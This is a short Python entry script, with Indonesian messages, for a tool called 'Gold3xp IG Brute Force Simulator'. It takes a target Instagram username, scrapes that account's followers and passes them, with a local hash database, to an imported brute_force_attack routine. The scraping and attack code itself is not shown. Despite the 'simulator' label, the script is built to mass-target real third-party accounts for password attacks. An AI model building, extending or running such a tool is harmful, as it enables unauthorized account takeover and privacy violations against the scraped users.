from utils.scraper import scrape_followers
from utils.brute_force import brute_force_attack
import json, os
from colorama import Fore, init
init(autoreset=True)

def load_hash_db(path="hash_db.json"):
    if not os.path.exists(path):
        print(Fore.RED + "[!] hash_db.json tidak ditemukan.")
        return {}
    with open(path, "r") as f:
        return json.load(f)

def main():
    print(Fore.CYAN + "=== Gold3xp IG Brute Force Simulator ===")
    target_username = input(Fore.YELLOW + "Masukkan username target: @").strip()

    print(Fore.YELLOW + "[*] Mengambil followers dari @" + target_username + "...")
    followers = scrape_followers(target_username)
    if not followers:
        print(Fore.RED + "[!] Tidak ada followers ditemukan.")
        return

    print(Fore.YELLOW + f"[*] {len(followers)} followers ditemukan. Memulai brute force...\n")
    hash_db = load_hash_db()
    brute_force_attack(followers, hash_db)

if __name__ == "__main__":
    main()
